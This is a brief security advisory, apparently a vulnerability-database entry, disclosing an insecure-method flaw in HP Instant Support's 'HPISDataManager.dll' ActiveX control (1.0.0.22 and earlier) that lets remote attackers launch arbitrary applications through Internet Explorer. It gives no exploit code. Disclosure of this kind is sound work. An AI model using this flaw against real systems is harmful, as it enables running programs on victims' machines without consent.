HP Instant Support 'HPISDataManager.dll' ActiveX control is prone to an insecure-method vulnerability.

Successfully exploiting this issue allows remote attackers to launch arbitrary applications with the privileges of the application running the ActiveX control (typically Internet Explorer).

Note that if the attacker could place a malicious executable on the system, they would be able to launch it using this vulnerability.

HP Instant Support 1.0.0.22 and earlier versions are affected.

NOTE: This issue was previously covered in BID 29526 (HP Instant Support 'HPISDataManager.dll' ActiveX Control Unspecified Code Execution Vulnerabilities), but has been given its own record because of new information.
